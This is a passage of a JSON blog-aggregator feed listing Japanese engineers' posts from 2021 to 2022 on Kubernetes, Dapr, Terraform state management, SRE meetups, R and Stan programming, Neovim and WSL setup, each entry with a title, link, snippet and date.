に登壇しました","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"[2022/03/04] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220304","contentSnippet":"普段は#kubenewsの2022年03月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/3s0T6k24I_o 告知とかニュースっぽいもの Twitterコミュニティ機能についてhttps://twitter.co...","isoDate":"2022-03-04T12:34:50.000Z","dateMiliSeconds":1646397290000,"authorName":"bells17","authorId":"bells17"},{"title":"RStudio Serverでblogdownを快適に使えるようにする","link":"https://blog.atusy.net/2022/03/02/blogdown-rstudio-server/","contentSnippet":"RStudioではうまくプレビューできたblogdown製のウェブページが、RStudio Serverではうまくプレビューできないことがあります。例えば以下のようなことが起きます。","isoDate":"2022-03-02T00:00:00.000Z","dateMiliSeconds":1646179200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ウェブサイトのCSSやJavaScriptでキャッシュの衝突を避ける","link":"https://blog.atusy.net/2022/03/02/hugo-css-fingerprint/","contentSnippet":"CSSやJavascriptのキャッシュはブラウジングの速度に貢献する一方、更新がクライアントサイドに適切に反映されない場合があります。ブラウザがキャッシュしている場合、キャッシュの有効起源切れを待つかスーパリロードを使うという手もあります。スーパーリロードはChromeやFirefoxではCtrl+Shift+Enterのキーボードショートカットでも実行できます。","isoDate":"2022-03-02T00:00:00.000Z","dateMiliSeconds":1646179200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/02/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220225","contentSnippet":"普段は#kubenewsの2022年02月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL: 配信中止して記事だけ放流したので配信URLはありません 告知とかニュースっぽいもの NetApp Insight Japan 2022で講演しましたセッション動...","isoDate":"2022-02-25T13:31:31.000Z","dateMiliSeconds":1645795891000,"authorName":"bells17","authorId":"bells17"},{"title":"`list.files`関数で拡張子を指定したファイルを一覧するなら、`pattern = \\"\\\\\\\\.csv$\\"`みたいにすること","link":"https://blog.atusy.net/2022/02/25/list-files-pattern/","contentSnippet":"list.files(pattern = \\".csv\\")みたいなのを見かけるけど、うっかりanalyze-csv.Rみたいなファイルにもマッチするよ。厳密にはlist.files(pattern = \\"\\\\\\\\.csv$\\")としよう。ファイル操作にはfsパッケージも便利。","isoDate":"2022-02-25T00:00:00.000Z","dateMiliSeconds":1645747200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【TypeScript】指定したパスのみ必須にするUtility Type","link":"https://zenn.dev/kimitsu/articles/c0cc29dde1c054","contentSnippet":"TypeScriptにはプロパティを必須にするRequiredというUtility Typeがある。type Props = {  a?: number;  b?: string;};const obj: Required<Props> = { a: 5, b: \\"test\\" }; // a, bが必須になるhttps://www.typescriptlang.org/docs/handbook/utility-types.html#requiredtypeRequiredは全てのプロパティを必須にする。なのでPropsのaのみ必須にしたい場合は次のようなU...","isoDate":"2022-02-24T15:11:31.000Z","dateMiliSeconds":1645715491000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Osaka.R Slackの朝もくチャンネルにツィートボタンを設置","link":"https://blog.atusy.net/2022/02/24/osakar-tweet-button/","contentSnippet":"Slackではチャンネル上部に関連ページへのリンクを設置できます。メッセージと関連ページのリンクをピン留めするこの機能を使って以下のように、TweetボタンをOsaka.R Slackの朝もくチャンネルに設置しました。","isoDate":"2022-02-24T00:00:00.000Z","dateMiliSeconds":1645660800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Neovimのconfigファイルをinit.lua化したので覚書","link":"https://blog.atusy.net/2022/02/21/nvim-init-lua/","contentSnippet":"Neovim 0.5からはconfigファイルにinit.luaとしてLuaスクリプトでの記述を推奨しているそうです。そこでVim/Nvim初心者が移行作業にあたって、どうやって情報を収集したか、途中で得た知見、やり残したことをまとめておきます。","isoDate":"2022-02-21T00:00:00.000Z","dateMiliSeconds":1645401600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Kubelet APIをcurlで叩く","link":"https://bells17.medium.com/curl-to-kubelet-api-f73cb17888b7?source=rss-713cf42ce34d------2","isoDate":"2022-02-10T16:10:23.000Z","dateMiliSeconds":1644509423000,"authorName":"bells17","authorId":"bells17"},{"title":"minidown 0.4.0をCRANにリリースしました","link":"https://blog.atusy.net/2022/02/09/minidown-0-4-0/","contentSnippet":"minidownパッケージはR Markdownにおけるhtml_documentをもっとイイ感じにしたものです。作った理由や凄いところはTokyo.R 95の発表資料にまとめてます。","isoDate":"2022-02-09T00:00:00.000Z","dateMiliSeconds":1644364800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"cronRパッケージで環境変数を指定する機能を追加するPRをした","link":"https://blog.atusy.net/2022/01/21/support-envvar-in-cronr/","contentSnippet":"登山本で紹介したパッケージの機能不足コメントを頂いたのが嬉し過ぎて、 パッケージに機能追加を提案してきました。","isoDate":"2022-01-21T00:00:00.000Z","dateMiliSeconds":1642723200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"書籍「Rが生産性を高める」のサポートサイトを公開しました","link":"https://blog.atusy.net/2022/01/20/r-efficiency-book-support-site/","contentSnippet":"igjitさん、hanaoriさんと共に「Rが生産性を高める〜データ分析ワークフロー効率化の実践〜」を共著しました。公式サイト：https://gihyo.jp/book/2022/978-4-297-12524-0サポートサイト: https://github.com/ghmagazine/r_efficiency_book電子版の発売は1/21、紙版の発売は1/26となっています。早くみなさんの元にお届けしたいですね。","isoDate":"2022-01-20T00:00:00.000Z","dateMiliSeconds":1642636800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"grepとユカイな仲間たち","link":"https://blog.atusy.net/2022/01/18/grep-and-friends/","contentSnippet":"help(grep)にあるgregexprとかを理解したい。","isoDate":"2022-01-18T00:00:00.000Z","dateMiliSeconds":1642464000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"StanでFused LASSOしてみたかった","link":"https://blog.atusy.net/2022/01/12/stan-fused-lasso/","contentSnippet":"テストデータgenlassoパッケージによる実装正則化項による実装状態空間モデルで実装コメントStanでLASSOを実装すると、罰則化項Lambdaも同時に最適化できる。そりゃいいなと思ったのでFused LASSOも実装してみたくなった。","isoDate":"2022-01-12T00:00:00.000Z","dateMiliSeconds":1641945600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Stanを使ったBayesian Lassoの実装に関するメモ","link":"https://blog.atusy.net/2022/01/09/bayesian-lasso/","contentSnippet":"LASSOは確率モデルだと係数の事前分布にラプラス分布を指定したものに相当するって話はちょいちょい聞くけど、実際の証明とか実装はどうなってるんだろうなーと思ったので、いくつかのサイトを渡り歩いてみた。","isoDate":"2022-01-09T00:00:00.000Z","dateMiliSeconds":1641686400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"RでPython風docstringを実装してみる","link":"https://blog.atusy.net/2021/12/20/r-docstring/","contentSnippet":"関数魔改造講座body編と言えるかもしれない……。黒魔術の世界へようこそ。","isoDate":"2021-12-20T00:00:00.000Z","dateMiliSeconds":1639958400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Accurateの内部実装","link":"https://bells17.medium.com/accurate-internal-70915fe716ca?source=rss-713cf42ce34d------2","isoDate":"2021-12-15T18:56:05.000Z","dateMiliSeconds":1639594565000,"authorName":"bells17","authorId":"bells17"},{"title":"Nuxt.jsを「正しく」終了する","link":"https://zenn.dev/satohjohn/articles/fd876409209ed1","contentSnippet":"はじめにこの記事はNuxt.js Advent Calendar2021の12日目の記事です。11日目は@Skmt3PさんのNuxtのコンポーネントをWeb Componentとして利用するでした。(web component触ってきてないからへぇって気持ちで読まさせていただきました) 概要hooks自体を調べていたときにcloseという項目がありました。そして、説明にはNuxt インスタンスが正しく終了したときというのがありました。「正しく」とは一体…となって原文を見てみるとNuxt instance is gracefully closing.というこ...","isoDate":"2021-12-11T15:35:11.000Z","dateMiliSeconds":1639236911000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Self containedなHTMLドキュメント生成時にiframeしたいなら`knitr::include_url`関数を使おう","link":"https://blog.atusy.net/2021/12/06/rmarkdown-iframe/","contentSnippet":"R Markdownのhtml_documentなどでHTMLドキュメントを作成すると、デフォルトではグラフなどの画像もHTML内に埋め込んでくれます。","isoDate":"2021-12-06T00:00:00.000Z","dateMiliSeconds":1638748800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Japan.RでTidy Tuesdayの企画した","link":"https://blog.atusy.net/2021/12/05/japanr2021/","contentSnippet":"みんなEnjoyしてくれて成功。私はTidy Tuesdayの企画と、コミュニティ運営に関するパネルディスカッションのパネラーをしました。","isoDate":"2021-12-05T00:00:00.000Z","dateMiliSeconds":1638662400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Daprつかってみた(Web APIのイメージでローカルストレージとGCSを同じように扱ってみる)","link":"https://zenn.dev/satohjohn/articles/96873574f07534","contentSnippet":"この記事は Web API Advent Calendar 2021 の5日目の記事になりますちなみに4日目は@sys_zeroさんのPower Automate for desktopの変数に関するTips「JSONにnull値がある場合の選択的置換」でした今回は、当日まで全く内容について考えられてなかったのですが、ふっと、頭にわいた、個人的に気になっているDaprについて調べて、ローカルストレージとGoogle Cloud Storage(以下GCS)を扱ってみます なんで今回Dapr？Daprを使うメリットの1つとして、他のサービスにつなぐ方法をHTTPまたはgRPCに...","isoDate":"2021-12-04T15:01:17.000Z","dateMiliSeconds":1638630077000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Tokyo.R 95でminidownパッケージを紹介でLTしてきました","link":"https://blog.atusy.net/2021/10/31/tokyor95/","contentSnippet":"LT時間切れで消化不良だったのに☆15もつけてくれてありがとう。","isoDate":"2021-10-31T00:00:00.000Z","dateMiliSeconds":1635638400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"LinuxでIntel製CPU内蔵のGPUを使うと動画再生時に画面がちらつく問題の対策","link":"https://blog.atusy.net/2021/10/24/linux-tearing-intel-gpu/","contentSnippet":"この1、2ヶ月ほどmanjaroで動画を再生する時、画面がちらつくようになったのが気になっていました。ググったところ、Intel製GPUの場合はちらつき防止のオプションがあるので有効化するといいみたいですね。","isoDate":"2021-10-24T00:00:00.000Z","dateMiliSeconds":1635033600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GKE CNI Deep Dive (2021)","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interf…","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"\uD83D\uDD0D 可観測性に入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/ke-guan-ce-xing-niru-men-siyou","contentSnippet":"社内LTにて、可観測性を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（SREに入門しよう）：\\rhttps://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","isoDate":"2021-10-22T04:00:00.000Z","dateMiliSeconds":1634875200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"WSLでGitHubのPersonal access token認証","link":"https://zenn.dev/tayusa/articles/f81e6551642867","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"macOS におけるエンドポイントセキュリティの取り組み","link":"https://speakerdeck.com/kyohmizu/macos-niokeruendopointosekiyuriteifalsequ-rizu-mi","contentSnippet":"Infra Study 2nd #5「低レイヤーの世界への誘い」のLT登壇資料です。\\rhttps://forkwell.connpass.com/event/222932/","isoDate":"2021-09-28T04:00:00.000Z","dateMiliSeconds":1632801600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"PandocでPDFを作成する時に表の枠線を格子状にする","link":"https://blog.atusy.net/2021/09/22/pandoc-partial-conversion-by-filter/","contentSnippet":"LuaフィルタからJSONフィルタを呼んで更にPandocを呼びます。辛い。 プリアンブルも必要。 R Markdownユーザーは素直にパッケージを使いましょう。","isoDate":"2021-09-22T00:00:00.000Z","dateMiliSeconds":1632268800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ブランチをディレクトリに割り当つつGit管理対象外ファイルも同期するgit worksyncを作った","link":"https://blog.atusy.net/2021/09/15/git-worksync-1-0-0/","contentSnippet":"ブランチごとに別ディレクトリで簡単に作業できるgit worksyncコマンドを作りました。.gitignoreに入っているファイルや、git addしていないファイルも良い感じに同期できます。.venvとかdataとかGitで管理したくないけど、なくてはならないディレクトリをいつもあなたの傍に。","isoDate":"2021-09-15T00:00:00.000Z","dateMiliSeconds":1631664000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Vuexの型定義でモジュールでの型解決してくれるようにしてみた","link":"https://zenn.dev/satohjohn/articles/b064cf966a9e20","contentSnippet":"前提Nuxt.jsでVuexを使っているのでそのときにhttps://github.com/ktsn/vuex-type-helper以下を利用させてもらっていましたただ、モジュールのstore場合利用時にtypeがうまくはまらないから、どうするんだろうとか色々見てたのですがあんまりいい手段が見つからなく、自分で型定義でテンプレートリテラル部分書いたらどうなんだろうとおもってやってみました。正直もっと良い手段があると思いますが、今回は自分の勉強踏まえの備忘録。そして、多分Vue3対応とかが入ったらちゃんと動いていくんだと思うので、後で書き換えればいいし、現状型の問題だけな...","isoDate":"2021-09-11T04:37:38.000Z","dateMiliSeconds":1631335058000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google ColabでRパッケージの再インストールを爆速にする","link":"https://blog.atusy.net/2021/08/30/quickly-install-r-packages-on-colab/","contentSnippet":"Google Driveを活用してtidymodelsパッケージの再インストールを5分から1秒に短縮した。","isoDate":"2021-08-30T00:00:00.000Z","dateMiliSeconds":1630281600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rの乱数生成関数は一発で色んなパラメータの分布を作れるよ","link":"https://blog.atusy.net/2021/08/13/vectorize-rng/","contentSnippet":"あまり知られていない事実かもしれませんが、Rで乱数を発生させる関数のパラメータはベクトル化されています。つまり、正規分布から3000個の乱数を作る時、1000個ごとに期待値を0、1、2と変えるようなことが簡単にできます。覚えておくとシミュレーションで乱数が必要な時に、関数呼び出しを一度に纏められて便利&高速です。","isoDate":"2021-08-13T00:00:00.000Z","dateMiliSeconds":1628812800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ストレングスファインダーのコーチングを受けてみた","link":"https://bells17.medium.com/strengthsfinder-2140afddf46f?source=rss-713cf42ce34d------2","isoDate":"2021-08-11T13:27:04.000Z","dateMiliSeconds":1628688424000,"authorName":"bells17","authorId":"bells17"},{"title":"書評「機械学習を解釈する技術」","link":"https://blog.atusy.net/2021/08/09/techniques-to-interpret-ml-models/","contentSnippet":"どんな人におすすめか購入を迷う場合感想頭から順に読みたい本付録が充実冒頭の解説がイカス森下光之助（@dropout009）著「機械学習を解釈する技術」を献本頂きました。8月4日から8日までの間に、暇を見つけては開いて読了。せっかくなので全体的な感想をまとめておきたいと思います。読む最中の感想はTwitterのスレッドに綴りました。本稿では蛇足になると判断して省略する部分も多いので、気になる人は覗いてください。","isoDate":"2021-08-09T00:00:00.000Z","dateMiliSeconds":1628467200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"\uD83C\uDFD7️ ドメイン駆動設計と依存性逆転の原則","link":"https://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","contentSnippet":"社内LTにて、ドメイン駆動設計と依存性逆転の原則を布教しましたʕ◔ϖ◔ʔ\\r\\rはてなブックマークのコメントもどうぞ！\\r\\rなお、ドメイン駆動設計を理解するためには、依存についても知る必要があります。\\r\\r是非、依存関係と依存オブジェクト注入もご参照ください\uD83D\uDC4D\uD83C\uDFFB","isoDate":"2021-08-06T04:00:00.000Z","dateMiliSeconds":1628222400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kube API Serverの内部実装を解説する技術同人誌を技術書典11で出しました!","link":"https://bells17.medium.com/wrote-the-kube-api-server-book-2155129db374?source=rss-713cf42ce34d------2","isoDate":"2021-07-19T09:16:43.000Z","dateMiliSeconds":1626686203000,"authorName":"bells17","authorId":"bells17"},{"title":"シェルでエイリアスを無視してコマンドを見つける","link":"https://blog.atusy.net/2021/07/14/shell-find-command/","contentSnippet":"CMD=\\"foo\\"echo \\"$( unalias $CMD &> /dev/null command -v $CMD)\\"でいい。詳細POSIXにはcommandコマンドがあり、引数をコマンドとして実行してくれます。command git config --get user.name#> atusyaliasを無視してくれる点が魅力ですね。","isoDate":"2021-07-14T00:00:00.000Z","dateMiliSeconds":1626220800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについて","link":"https://zenn.dev/nnaka2992/articles/1fa7fb5d03f958","contentSnippet":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについてTable of ContentsOracleインストール中にでたSysctl系エラーであたったkernel parameterについてMotivationそもそもsysctlとは何なのか？Oracleセットアップ中に遭遇したkernel parameterssemopm変更方法セマフォ(semaphore)とは？SEMSMLSEMMNSSEMOPMSEMMNIfile-max変更方法rem_default/rem_max/...","isoDate":"2021-07-11T08:41:03.000Z","dateMiliSeconds":1625992863000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitHub CLI（`gh`）に曖昧検索の力を加えるghfコマンドを作ってzshプラグイン化した","link":"https://blog.atusy.net/2021/07/10/publish-gh-fzf/","contentSnippet":"端末上でレポジトリやissueを曖昧検索して内容をプレビューし、確定したらブラウザで開くなどの操作ができるghfコマンドを作りました。詳しい利用方法やインストール方法は→https://github.com/atusy/gh-fzf。zshプラグイン化しているのでzinitなどのユーザーは導入しやすいと思います。","isoDate":"2021-07-10T00:00:00.000Z","dateMiliSeconds":1625875200000,"authorName":"Atsushi 